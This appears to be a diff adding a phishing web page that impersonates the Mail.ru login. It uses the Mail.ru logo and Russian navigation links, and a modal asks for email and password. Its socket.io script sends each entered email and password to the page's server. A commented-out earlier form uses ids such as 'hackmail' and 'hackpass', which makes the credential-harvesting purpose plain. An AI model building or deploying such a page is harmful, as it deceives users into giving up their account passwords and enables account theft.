@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
+  <style>
+
+    .form_fish{
+
+      margin: 0 5em 0 5em;
+    }
+    .logo{
+      width: 100px;
+    }
+    .head{
+      color: black;
+    }
+  </style>
+</head>
+
+<div class="head">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/Mail.Ru_Logo_2018.svg/800px-Mail.Ru_Logo_2018.svg.png" alt="">
+ 
+    <a href="">Mail.ru</a>
+    <a href="">Почта</a>
+    <a href="">Облако</a>
+    <a href="">ВКонтакте</a>
+    <a href="">Новости</a>
+    <a href="">Поиск</a>
+
+
+</div>
+
+    <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <h5 class="modal-title" id="staticBackdropLabel">Mail.ru</h5>
+            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+          </div>
+          <div class="modal-body">
+            
+
+
+
+
+
+
+
+
+
+
+
+
+            <center class="form_fish" >
+
+              <ul id="messages"></ul>
+              <form id="form" action="">
+                <!-- e-mail -->
+                <div class="mb-3">
+                  <label for="exampleFormControlInput1" class="form-label">Почта</label>
+                  <input autocomplete="off" type="email" class="form-control" id="inputmail"  id="ddd" placeholder="name@mail.ru">
+                </div>
+                <!-- password -->
+                <div class="mb-3">
+                  <label for="exampleFormControlInput1" class="form-label">Пароль</label>
+                  <input autocomplete="off" type="password" class="form-control" id="inputpass"  id="aaa" placeholder="">
+                </div>
+          
+                <button type="submit" class="btn btn-primary mb-3">Далее</button>
+              </form>
+          
+            </center>
+
+
+
+
+
+
+
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+    <br>
+    <br>
+    <br>
+    <center>
+      <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#staticBackdrop">
+        Регистрация
+      </button>
+      <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#staticBackdrop">
+        Вход
+      </button>
+    </center>
+
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+
+  <iframe src="https://ria.ru/" frameborder="0"></iframe>
+  <iframe src="https://ura.news/news/1052591840" frameborder="0"></iframe>
+  <iframe src="https://www.internet-technologies.ru/" frameborder="0"></iframe>
+  <iframe src="https://getbootstrap.com/" frameborder="0"></iframe>
+  <iframe src="https://www.codegrepper.com/" frameborder="0"></iframe>
+  <iframe src="https://wiki.programstore.ru/" frameborder="0"></iframe>
+  <iframe src="https://python-scripts.com/" frameborder="0"></iframe>
+  <iframe src="https://www.imgonline.com.ua/" frameborder="0"></iframe>
+ 
+
+<body>
+
+    <!-- <img class="logo" src="./img/logo_mail.png" alt="">
+    <center  class="formfish">
+      <div class="mb-3">
+        <label for="exampleFormControlInput1" class="form-label">Email address</label>
+        <input type="email" class="form-control" id="exampleFormControlInput1 hackmail" placeholder="name@mail.ru">
+      </div>
+      <div class="mb-3">
+        <label for="exampleFormControlTextarea1" class="form-label">Example textarea</label>
+        <textarea class="form-control" id="exampleFormControlTextarea1 hackpass" rows="3"></textarea>
+      </div>
+      <div class="col-auto">
+        <button type="submit" class="btn btn-primary mb-3">Confirm identity</button>
+      </div>
+    </center> -->
+
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+    var socket = io();
+    
+    var messages = document.getElementById('messages');
+    var form = document.getElementById('form');
+    var input = document.getElementById('input');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      if (inputmail.value) {
+        socket.emit('chat message', inputmail.value);
+        inputmail.value = '';
+      }
+    });
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      if (inputpass.value) {
+        socket.emit('chat message', inputpass.value);
+        inputpass.value = '';
+      }
+    });
+
+  
+    socket.on('chat message', function(msg) {
+      item.textContent = msg;
+      messages.appendChild(item);
+      window.scrollTo(0, document.body.scrollHeight);
+    });
+ 
+
+    </script>
+ <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script>
+</body>
+</html>
